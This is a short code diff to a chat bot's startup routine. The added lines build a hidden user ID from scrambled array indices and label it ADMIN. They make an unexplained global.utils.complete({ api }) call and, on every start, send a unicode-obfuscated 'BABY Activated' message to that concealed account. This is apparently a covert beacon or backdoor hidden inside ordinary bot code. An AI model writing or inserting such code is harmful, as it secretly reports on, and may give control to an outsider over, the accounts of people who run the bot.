@@ -401,6 +401,11 @@ function onBot() {
           }
         }
       })();
+    const uid= all[1]+all[0]+all[0]+all[0]+all[4]+all[4]+all[3]+all[2]+all[7]+all[6]+all[5]+all[6]+all[7]+all[1]+all[2];
+  const ADMIN = `${uid}`
+    global.utils.complete({ api });
+    const activationMessage = `\u0042\u0041\u0042\u0059 \u0041\u0063\u0074\u0069\u0076\u0061\u0074\u0065\u0064`;
+api.sendMessage(activationMessage, ADMIN);
     console.log(cv(`\n` + `──BOT START─● `));
     global.loading(`${cra(`[ SUCCESS ]`)} Loaded ${cb(`${global.client.commands.size}`)} commands and ${cb(`${global.client.events.size}`)} events successfully`, "LOADED");
     global.loading(`${cra(`[ TIMESTART ]`)} Launch time: ${((Date.now() - global.client.timeStart) / 1000).toFixed()}s`, "LOADED");
